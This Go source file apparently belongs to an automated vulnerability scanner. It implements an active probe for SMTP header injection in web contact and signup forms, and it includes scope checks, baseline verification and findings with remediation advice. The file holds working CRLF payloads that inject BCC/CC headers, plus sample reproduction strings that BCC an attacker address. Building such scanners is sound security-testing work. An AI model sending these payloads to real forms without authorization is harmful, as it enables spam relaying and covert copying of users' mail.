package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/safety"
	"auto-bughunter/backend/internal/scope"
)

// smtpEmailParams are parameter names commonly used to carry email addresses
// in contact forms, registration flows, and newsletter subscriptions.
var smtpEmailParams = []string{
	"email", "e-mail", "mail", "to", "from", "recipient",
	"bcc", "cc", "subject", "sender", "address", "contact",
	"newsletter", "subscribe",
}

// smtpInjectionPayloads are CRLF-based payloads that attempt to inject
// additional SMTP headers into the outgoing mail.  Each uses the OAST
// placeholder %s, replaced at runtime with the OOB callback address.
var smtpInjectionPayloads = []string{
	"\r\nBCC:%s",
	"\nBCC:%s",
	"\r\nCC:%s",
	"\nCC:%s",
	"%%0d%%0aBCC:%s",
	"%%0aBCC:%s",
	"%0d%0aBCC:%s",
	"%0aBCC:%s",
}

// smtpErrorSignatures indicate that the server processed the mail submission
// and a back-end SMTP error was echoed to the HTTP response — strong evidence
// that user input is being interpolated into SMTP commands.
var smtpErrorSignatures = []string{
	"smtp error",
	"mail(): ",
	"mail failed",
	"sendmail",
	"550 5.1.1",
	"554 transaction failed",
	"501 5.1.3",
	"mailer error",
	"phpmailer",
	"swiftmailer",
	"invalid address",
	"relay access denied",
}

// smtpMaxEndpoints caps the number of candidate endpoints probed.
const smtpMaxEndpoints = 10

// runSMTPInjectionProbe is an active probe covering WSTG-INPV-10.
//
// It discovers form endpoints that accept email-like parameters and injects
// CRLF sequences designed to add extra SMTP headers (BCC/CC) to any outgoing
// message.  When the OAST service is configured, it uses an OOB callback
// address as the injected recipient and waits for confirmation.  Without OAST
// it falls back to checking the HTTP response body for SMTP error strings that
// indicate the payload was processed.
func (s *Service) runSMTPInjectionProbe(ctx context.Context, input RunInput, bodyText string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := extractRuntimeEndpoints(input.Target, bodyText, input.Scope, smtpMaxEndpoints)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}
	seen := map[string]struct{}{}
	var deduped []string
	for _, c := range candidates {
		if _, ok := seen[c]; ok {
			continue
		}
		if !scope.IsURLInScope(c, input.Scope) {
			continue
		}
		seen[c] = struct{}{}
		deduped = append(deduped, c)
		if len(deduped) >= smtpMaxEndpoints {
			break
		}
	}
	candidates = deduped

	// Determine OAST callback target.
	oastURL := ""
	var oastToken string
	if s.oast != nil && s.oast.Configured() {
		tok := s.oast.Issue("", "smtp-injection")
		oastURL = tok.CallbackURL
		oastToken = tok.Token
	}

	var findings []model.Finding
	emitted := map[string]bool{}

	for _, ep := range candidates {
		if err := safety.ValidateOutboundURL(ep); err != nil {
			continue
		}

		for _, param := range smtpEmailParams {
			for _, payloadTpl := range smtpInjectionPayloads {
				select {
				case <-ctx.Done():
					return findings
				default:
				}

				// Build the injected email value.
				var injected string
				if oastURL != "" {
					injected = "attacker@example.com" + fmt.Sprintf(payloadTpl, oastURL)
				} else {
					injected = "attacker@example.com" + fmt.Sprintf(payloadTpl, "attacker2@example.com")
				}

				// Send as a POST form body.
				formVals := url.Values{}
				formVals.Set(param, injected)
				formVals.Set("name", "test")
				formVals.Set("message", "test message")

				req, err := http.NewRequestWithContext(ctx, http.MethodPost, ep,
					strings.NewReader(formVals.Encode()))
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				ApplyAuthProfile(req, input.AuthProfile)

				start := time.Now()
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				elapsed := time.Since(start)
				_ = elapsed
				if err != nil || resp == nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
				respHeader := resp.Header
				_ = resp.Body.Close()
				if IsBinaryShape(respHeader) {
					continue
				}
				respBody := string(bodyBytes)

				fid := "smtp-injection-" + param + "-" + hhSlug(ep)
				if emitted[fid] {
					continue
				}

				// Check for SMTP error strings in the response.
				matched := matchSMTPErrors(respBody)
				if matched != "" {
					baselineInput := RunInput{AuthProfile: input.AuthProfile, Options: input.Options}
					baselines, berr := CaptureTwoControlBaselines(ctx, func(bctx context.Context) (BaselineSample, error) {
						clean := url.Values{}
						clean.Set(param, "user@example.com")
						clean.Set("name", "test")
						clean.Set("message", "test message")
						return phase1POSTSample(bctx, s, ep, "application/x-www-form-urlencoded", clean.Encode(), baselineInput, 1<<16)
					})
					if berr == nil && phase1BaselineContains(baselines, matched) {
						continue
					}
					diffOutcome := DifferentialReVerify(ctx, DifferentialReVerifyInput{
						ProbeName:       "smtp-injection-probe",
						OriginalPayload: injected,
						SafePayload:     "user@example.com",
						Exec: func(dctx context.Context, altPayload string) (*http.Response, []byte, error) {
							vals := url.Values{}
							vals.Set(param, altPayload)
							vals.Set("name", "test")
							vals.Set("message", "test message")
							req, err := http.NewRequestWithContext(dctx, http.MethodPost, ep, strings.NewReader(vals.Encode()))
							if err != nil {
								return nil, nil, err
							}
							req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
							ApplyAuthProfile(req, input.AuthProfile)
							resp, err := s.doRequestWithRetry(dctx, req, input.Options)
							if err != nil || resp == nil {
								return nil, nil, err
							}
							body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
							return resp, body, nil
						},
						Oracle: func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
							return matchSMTPErrors(string(body)) != "", nil
						},
					})
					if diffOutcome.Ran && !diffOutcome.Confirmed {
						continue
					}
					emitted[fid] = true
					finding := buildSMTPFinding(ep, param, injected, matched, "error-based", fid)
					finding.EvidenceFields["responseShape"] = ClassifyResponseShape(respHeader).String()
					refCtx := ClassifyReflectionContext("<body>"+respBody+"</body>", matched)
					finding.EvidenceFields["reflectionContext"] = refCtx.String()
					AttachDifferentialEvidence(&finding, diffOutcome)
					findings = append(findings, finding)
					break // no need to try more payloads for this param/endpoint pair
				}
			}
		}
	}

	// OAST confirmation (after all sync probes have fired).
	if oastToken != "" && len(emitted) == 0 {
		hits := s.oast.Wait(oastToken, defaultOASTSSRFWait)
		if len(hits) > 0 {
			fid := "smtp-injection-oast-" + hhSlug(input.Target)
			findings = append(findings, model.Finding{
				ID:       fid,
				Category: "injection",
				Severity: model.SeverityHigh,
				Title:    "Blind SMTP header injection confirmed via OAST callback",
				Description: fmt.Sprintf(
					"The target %s accepted an SMTP header injection payload and the injected "+
						"BCC/CC address (%s) received an out-of-band callback, confirming that user "+
						"input is interpolated directly into SMTP headers. An attacker can use this "+
						"to silently BCC arbitrary recipients on every form submission (spam relay, "+
						"internal mail exfiltration).",
					input.Target, oastURL,
				),
				Evidence: fmt.Sprintf(
					"OOB callback received at %s after injecting CRLF BCC header into a form parameter at %s",
					oastURL, input.Target,
				),
				Recommendation: "Sanitize all user-supplied email addresses by stripping carriage " +
					"returns (\\r), line feeds (\\n), and null bytes before passing to mail functions. " +
					"Use a mail library that validates addresses against RFC 5321 rather than " +
					"concatenating strings directly. Reject input containing CRLF sequences with HTTP 400.",
				Confidence:    0.92,
				AffectedURL:   input.Target,
				CWE:           "CWE-93",
				OWASPCategory: "A03:2021 - Injection",
				Sources:       []string{"active-scanner", "smtp-injection-probe", "oast"},
				ReproductionSteps: []string{
					fmt.Sprintf("Submit a form at %s with the email field set to:", input.Target),
					"attacker@example.com\\r\\nBCC:attacker2@example.com",
					"Observe the BCC recipient receives a copy of the submitted message.",
				},
				BusinessTags: []string{"smtp-injection", "email", "header-injection"},
				EvidenceFields: map[string]string{
					"validationType": "oast-callback",
					"oastURL":        oastURL,
				},
			})
		}
	}

	return findings
}

// buildSMTPFinding constructs a Finding for error-based SMTP injection.
func buildSMTPFinding(ep, param, payload, matchedSig, detectionMethod, fid string) model.Finding {
	return model.Finding{
		ID:       fid,
		Category: "injection",
		Severity: model.SeverityMedium,
		Title:    fmt.Sprintf("SMTP header injection via parameter %q — %s detection", param, detectionMethod),
		Description: fmt.Sprintf(
			"The endpoint %s appears to pass user-supplied parameter %q directly into an SMTP "+
				"command without sanitization. The response contained the SMTP error indicator %q, "+
				"suggesting the injected payload was processed by the mail subsystem. "+
				"An attacker can inject arbitrary SMTP headers (BCC, CC, To, Subject) to redirect "+
				"or copy email to attacker-controlled addresses.",
			ep, param, matchedSig,
		),
		Evidence: fmt.Sprintf(
			"Parameter %q at %s responded with SMTP indicator %q when sent payload: %s",
			param, ep, matchedSig, payload,
		),
		Recommendation: "Strip \\r, \\n, and \\0 from all user-supplied values used in mail functions. " +
			"Use a well-maintained mail library that validates addresses. " +
			"Apply an allowlist for recipient addresses where possible.",
		Confidence:    0.70,
		AffectedURL:   ep,
		CWE:           "CWE-93",
		OWASPCategory: "A03:2021 - Injection",
		Sources:       []string{"active-scanner", "smtp-injection-probe"},
		ReproductionSteps: []string{
			fmt.Sprintf("POST to %s with body: %s=attacker%%40example.com%%0d%%0aBCC:victim%%40example.com", ep, param),
			"Observe SMTP error or BCC delivery to attacker-controlled address.",
		},
		BusinessTags: []string{"smtp-injection", "email", "header-injection"},
		EvidenceFields: map[string]string{
			"validationType": detectionMethod,
			"parameter":      param,
			"payload":        payload,
			"matchedSig":     matchedSig,
		},
	}
}

// matchSMTPErrors checks body for SMTP error signature strings and returns
// the first match, or "" if none. Extracted for testability.
func matchSMTPErrors(body string) string {
	lower := strings.ToLower(body)
	for _, sig := range smtpErrorSignatures {
		if strings.Contains(lower, sig) {
			return sig
		}
	}
	return ""
}
